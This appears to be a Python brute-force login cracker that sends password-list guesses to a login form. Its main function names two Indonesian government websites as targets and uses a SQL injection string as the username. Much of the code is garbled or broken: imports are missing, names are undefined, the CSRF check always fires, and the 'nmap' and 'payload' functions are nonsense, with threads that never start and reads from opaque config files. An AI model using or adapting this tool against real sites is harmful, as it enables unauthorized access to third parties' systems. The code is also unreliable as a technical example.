######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7      
# If you use the code give me the credit please #
######################################################################################################

import getopt
import os
import sys
import threading
from distutils.command.config import config
from term import reverse
import assu



class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message

        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, password):
        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
        response = requests.post(self.url, data=data_dict)
        if self.error_message in str(response.content):
            return False
        elif "CSRF" or "csrf" in str(response.content):
            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
            sys.exit()
        else:
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            return True

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            return

reading = open("config.bin").read()


def nmap(filename):
    filename.write("")
    pwd = os.getcwd()
    if os.path.isfile(filename):
        threading.Thread(target=assu.lol, args=(pwd, filename))
        os.access(filename, os.R_OK)
        filename.split("********************************")


def payload():
    assu.get(config)
    filenya()
    threading.Thread(target=nmap, args=("hasil.txt",))
    threading.Thread(target=nmap, args=("hasil2.txt",))
    threading.Thread(target=nmap, args=("hasil3.txt",))
    threading.Thread(target=nmap, args=("hasil4.txt",))
    threading.Thread(target=nmap, args=("hasil5.txt",))
    threading.Thread(target=nmap, args=("hasil6.txt",))
    threading.Thread(target=nmap, args=("hasil7.txt",))
    threading.Thread(target=nmap, args=("hasil8.txt",))
    threading.Thread(target=nmap, args=("hasil9.txt",))
    threading.Thread(target=nmap, args=("hasil10.txt",))


def filenya():
    winput = open("config.hc").read()
    req1 = getopt.gnu_getopt(winput.split(" "), "")
    req1.index(payload)
    winput.split(reading)

def main():
    url = '[www.dpr.go.id + dpr.go.id]+[www.kemdikbud.go.id + kemdikbud.go.id]'
    username = 'Select id from users where username=’username’ and password=’password’ or 1=1--+'
    cracker = BruteForceCracker(url, username, error)
    
    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    key = '#\x0f\xc7d^\x1c~\x02\xca\xe2^(\x9fB])'
    unidentified = False
    iv = "796287ab2d7fef4f".split('hex')
    rev_ciphertext = ""
    rev_key = payload
    nmi = assu.lol(rev_ciphertext)
    inmap = reverse
    sys.stdout.write('hasil.txt')
    print(payload)
    banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
"""
